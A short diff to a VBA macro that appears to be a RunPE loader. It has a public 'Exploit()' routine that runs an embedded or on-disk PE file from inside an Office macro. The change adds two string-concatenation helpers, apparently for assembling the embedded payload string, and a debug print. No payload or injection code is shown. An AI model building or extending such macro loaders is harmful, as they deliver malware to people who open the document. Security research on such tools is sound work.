@@ -443,6 +443,28 @@ Private Function StringToByteArray(strContent As String) As Byte()
     StringToByteArray = baContent
 End Function
 
+' --------------------------------------------------------------------------------
+' Method:    A
+' Desc:      Append a Char to a String.
+' Arguments: strA - Input String. E.g.: "AAA"
+'            bChar - Input Char as a Byte. E.g.: 66 or &H42
+' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
+' --------------------------------------------------------------------------------
+Private Function A(strA As String, bChar As Byte) As String
+    A = strA & Chr(bChar)
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    B
+' Desc:      Append a String to another String.
+' Arguments: strA - Input String 1. E.g.: "AAAA"
+'            strB - Input String 2. E.g.: "BBBB"
+' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
+' --------------------------------------------------------------------------------
+Private Function B(strA As String, strB As String) As String
+    B = strA + strB
+End Function
+
 
 ' ================================================================================
 '                                ~~~ EMBEDDED PE ~~~
@@ -716,9 +738,11 @@ Public Sub Exploit()
         baFileContent = FileToByteArray(strSrcFile)
         Call RunPE(baFileContent, strArguments)
     Else
+        Debug.Print ("[+] Source file: embedded PE")
         baFileContent = StringToByteArray(strPE)
         Call RunPE(baFileContent, strArguments)
     End If
 
 End Sub
+
 
